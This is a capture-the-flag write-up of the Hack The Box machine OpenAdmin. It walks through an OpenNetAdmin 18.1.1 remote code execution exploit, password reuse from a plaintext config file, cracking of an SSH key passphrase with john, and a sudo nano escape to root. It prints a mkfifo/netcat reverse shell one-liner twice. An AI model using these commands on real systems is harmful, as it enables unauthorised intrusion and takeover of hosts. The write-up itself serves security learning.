---
title: 'OpenAdmin'
target: 'Hack The Box — OpenAdmin'
difficulty: 'easy'
date: 2025-11-19
summary: 'An HTB machine — scanning with nmap to find SSH (22) running OpenSSH 7.6p1 and HTTP (80) running Apache 2.4.29 serving the Ubuntu default page on an Ubuntu host, running dirsearch to discover /music which redirects to /ona/ running OpenNetAdmin 18.1.1, exploiting a known RCE vulnerability in OpenNetAdmin 18.1.1 to obtain a reverse shell as www-data, finding database credentials (n1nj4W4rri0R!) in /opt/ona/www/local/config/database_settings.inc.php, reusing that password to su to jimmy, discovering /var/www/internal/ owned by jimmy containing main.php that reads joanna''s SSH private key, finding an internal-only port 52846 via netstat and curling localhost:52846/main.php to retrieve joanna''s encrypted RSA key, cracking the passphrase with ssh2john and john to reveal bloodninjas, SSHing in as joanna, discovering sudo nano /opt/priv runs as root without a password, and using nano''s execute command feature to spawn a root reverse shell.'
role: 'pentest'
tags: ['nmap', 'dirsearch', 'apache', 'opennetadmin', 'rce', 'password-reuse', 'ssh', 'john', 'ssh2john', 'nano', 'sudo', 'gtfobins', 'privilege-escalation', 'linux']
problem: 'OpenAdmin is an easy-rated Ubuntu machine with two open ports — SSH (22) running OpenSSH 7.6p1 and HTTP (80) running Apache 2.4.29 serving the default Ubuntu page. Directory enumeration reveals /music which redirects to /ona/ running OpenNetAdmin 18.1.1 — a network administration tool vulnerable to unauthenticated remote code execution. The web application stores database credentials in plaintext at /opt/ona/www/local/config/database_settings.inc.php, and the user jimmy reuses that password for his system account. An internal web application on port 52846 owned by jimmy reads joanna''s SSH private key through main.php, and joanna''s encrypted key can be cracked with john. Joanna has passwordless sudo access to run nano on /opt/priv, which can be leveraged through nano''s built-in command execution for privilege escalation to root.'
action: 'Ran nmap with aggressive scan (-A) to identify two open ports — 22/tcp (SSH) running OpenSSH 7.6p1 and 80/tcp (HTTP) running Apache 2.4.29 with the default Ubuntu page. Ran dirsearch against the web server and discovered /music, which contained a login link that redirected to /ona/ — OpenNetAdmin 18.1.1. Identified the version as vulnerable to RCE. Used the ona-rce exploit (python3 exploit.py) against http://10.10.10.171/ona/ to gain a shell. Set up a netcat reverse shell from the target back to the attacker machine on port 443 to obtain an interactive shell as www-data. Found database credentials in /opt/ona/www/local/config/database_settings.inc.php — ona_sys:n1nj4W4rri0R!. Discovered two users in /home — jimmy and joanna. Used su to switch to jimmy with the database password n1nj4W4rri0R! (password reuse). Found /var/www/internal/ directory owned by jimmy:internal containing index.php, logout.php, and main.php. Examined main.php which executes shell_exec to read /home/joanna/.ssh/id_rsa. Ran netstat -tl as jimmy and discovered port 52846 listening on localhost only. Curled localhost:52846/main.php to retrieve joanna''s encrypted RSA private key. Ran ssh2john.py to extract the hash and cracked the passphrase with john using rockyou.txt — revealing bloodninjas. SSHed in as joanna@10.10.10.171 with the cracked key. Retrieved the user flag. Checked sudo permissions and found (ALL) NOPASSWD: /bin/nano /opt/priv. Used nano''s Ctrl+R (read file) then Ctrl+X (execute command) feature to run a reverse shell command, obtaining a root shell on the netcat listener. Retrieved the root flag.'
outcome: 'Gained root access through a four-stage attack chain. OpenNetAdmin 18.1.1 RCE provided initial access as www-data, database credential reuse escalated to jimmy, an internal web application on port 52846 exposed joanna''s encrypted SSH key which was cracked with john, and passwordless sudo access to nano provided root through GTFOBins command execution.'
draft: false
---

## Background

OpenAdmin is an easy-rated Linux machine that chains together several common real-world misconfigurations — an outdated web application with a known RCE, plaintext database credentials reused as a system password, an internal web application that exposes sensitive files, and a sudo misconfiguration that grants root. The machine requires four separate escalation steps from initial foothold to root, each building on information gathered in the previous stage. Unlike machines where a single exploit grants root, OpenAdmin requires methodical enumeration at each privilege level to find the path forward.

---

## Enumeration

An nmap scan against the target reveals two open ports:

```
nmap -A 10.10.10.171
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Two services — **SSH on port 22** and **HTTP on port 80**. The web server is Apache 2.4.29 on Ubuntu, serving the default Apache2 page with no custom content. With nothing visible on the landing page, directory brute forcing is the next step:

```
python3 dirsearch.py -u http://10.10.10.171/ -e / -t 50
```

```
[07:40:30] 200 -   11KB - /
[07:40:53] 200 -   11KB - /index.html
[07:40:57] 301 -  312B  - /music  ->  http://10.10.10.171/music/
```

The `/music` directory hosts a website with several pages, but nothing immediately useful. However, clicking the login link redirects to `/ona/` — an entirely different application:

![Browser showing the OpenNetAdmin dashboard at 10.10.10.171/ona/ with a yellow warning banner stating the installed version is v18.1.1 and is not the latest release. The Record Counts panel shows 1 DNS Domain and 0 for all other entries. The Where to begin panel lists tasks including Add a DNS domain, Add a new subnet, Add a new host, Perform a search, and List Hosts. The user is logged in as guest.](/writeups/htb-openadmin/01-ona-dashboard.png)

**OpenNetAdmin 18.1.1** — a web-based network administration tool. The version banner immediately stands out: v18.1.1 with a warning that it's not the latest release. This version has a known unauthenticated remote code execution vulnerability.

---

## Initial shell — OpenNetAdmin RCE

OpenNetAdmin 18.1.1 is vulnerable to command injection through its web interface. Using a publicly available [exploit](https://github.com/amriunix/ona-rce) to gain initial access:

![Split terminal view. Top pane shows python3 exploit.py exploit http://10.10.10.171/ona/ with output indicating OpenNetAdmin 18.1.1 Remote Code Execution, Connecting, Connected Successfully, and a shell prompt. A reverse shell command using mkfifo and netcat is entered. Bottom pane shows nc -vlp 443 on the attacker machine receiving a connection from 10.10.10.171 port 49024 with a basic shell prompt.](/writeups/htb-openadmin/02-ona-rce-shell.png)

The exploit connects successfully and provides command execution. To upgrade to a proper interactive shell, a netcat reverse shell is set up:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.196 443 >/tmp/f
```

The reverse shell connects back on port 443 as `www-data` — the Apache web server's default user. This is an unprivileged service account, so enumeration continues from here.

---

## Lateral movement — www-data to jimmy

Searching through the OpenNetAdmin installation for credentials reveals the database configuration file at `/opt/ona/www/local/config/database_settings.inc.php`, which stores credentials in plaintext:

```
ona_sys : n1nj4W4rri0R!
```

The database itself doesn't contain anything useful, but the `/home` directory reveals two user accounts — `jimmy` and `joanna`. Testing the database password as a system credential for jimmy:

```
su jimmy
Password: n1nj4W4rri0R!
```

The password works — jimmy reuses the database password for his system account. This is a common pattern: developers or administrators use the same password across services on the same machine, and a single plaintext credential file exposes all of them.

---

## Lateral movement — jimmy to joanna

As jimmy, enumerating the filesystem reveals an interesting directory that was inaccessible as www-data:

```
drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 /var/www/internal
```

The directory is owned by `jimmy:internal` and contains three PHP files — `index.php`, `logout.php`, and `main.php`. The content of `main.php` is particularly revealing:

```php
<?php
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This script reads joanna's SSH private key and outputs it as HTML. But this application wasn't found during web enumeration on port 80, which means it's running on a different port. Checking for internal listening services:

![Terminal as jimmy@openadmin showing netstat -tl output with active listening connections — localhost:domain, 0.0.0.0:ssh, localhost:mysql, localhost:52846, and IPv6 ssh and http.](/writeups/htb-openadmin/03-netstat-internal.png)

Port **52846** is listening on localhost only — not externally accessible, which is why it wasn't discovered during the initial nmap scan. Curling the internal application:

```
curl -s localhost:52846/main.php
```

```
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Joanna's encrypted RSA private key is retrieved through the internal web application. The key is passphrase-protected, so it needs to be cracked. Using `ssh2john` to extract a hash and john with `rockyou.txt`:

```
python3 /usr/share/john/ssh2john.py joanna-ssh > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
bloodninjas      (joanna-ssh)
Session completed
```

The passphrase is **bloodninjas**. Logging in as joanna:

```
ssh joanna@10.10.10.171 -i joanna-ssh
Enter passphrase for key 'joanna-ssh': bloodninjas
```

![Terminal as joanna@openadmin showing whoami returning joanna, id showing uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal), hostname returning openadmin, and ifconfig showing ens160 with inet 10.10.10.171 netmask 255.255.255.0.](/writeups/htb-openadmin/04-joanna-shell.png)

A shell as joanna, confirmed with `whoami`, `id`, and `ifconfig`. Joanna is a member of the `internal` group — which explains her access to the internal web application directory. The user flag was retrieved.

---

## Privilege escalation — sudo nano

Checking joanna's sudo permissions:

```
sudo -l
```

```
(ALL) NOPASSWD: /bin/nano /opt/priv
```

Joanna can run `nano /opt/priv` as root without a password. Nano is a text editor with built-in file reading and command execution capabilities — a well-documented [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) entry. The escalation path uses nano's internal commands:

```
sudo /bin/nano /opt/priv
```

Once inside nano, pressing `Ctrl+R` opens the "Read File" prompt, and then `Ctrl+X` switches to "Execute Command" — allowing arbitrary command execution as root. Running a reverse shell through this:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.196 443 >/tmp/f
```

![Terminal showing nc -lvp 443 receiving a connection from 10.10.10.171. Commands whoami, id, hostname, and ifconfig confirm root access — uid=0(root) gid=0(root) groups=0(root) on host openadmin with IP 10.10.10.171. The bottom of the screen shows the nano editor with the reverse shell command in the execute field.](/writeups/htb-openadmin/05-root-shell.png)

A root shell connects back on the netcat listener — `uid=0(root)`. The root flag was retrieved.

---

## What I took from this

OpenAdmin's attack chain is a textbook example of how multiple low-severity issues compound into full system compromise. No single vulnerability here is catastrophic in isolation — an outdated web application, a plaintext config file, password reuse, an internal application with overly permissive file access, and a sudo misconfiguration. Each one provides a stepping stone to the next, and the total impact is root access from an unauthenticated starting position.

The OpenNetAdmin RCE is the entry point, and it reinforces a basic but important principle: keeping software updated matters. Version 18.1.1 had a known, publicly exploited RCE, and the application even displays its own version on the dashboard with a warning to update. The exploit requires no authentication — the guest account has enough access to trigger the command injection.

The password reuse chain through the middle of the box is realistic. A database password stored in a PHP config file is normal and expected — applications need their credentials somewhere. The problem is when the same password is reused for system accounts. The jump from `www-data` to `jimmy` happened entirely because of this reuse, not through any technical vulnerability.

The internal web application on port 52846 is a good reminder to check for services bound to localhost. External nmap scans won't find them, and they're often less hardened because developers assume that localhost-only means secure. In this case, the internal application was a simple PHP script that handed out joanna's SSH private key to anyone who could reach it — and jimmy could reach it because the directory permissions included the `internal` group.

The nano privilege escalation is a clean example of why sudo rules need to consider what a binary can actually do, not just what it's intended to do. Nano is a text editor, but it has built-in command execution through `Ctrl+R` followed by `Ctrl+X`. GTFOBins documents these capabilities for dozens of common Linux utilities. A sudo rule that allows running nano as root effectively allows running any command as root — the editor is just the vehicle.
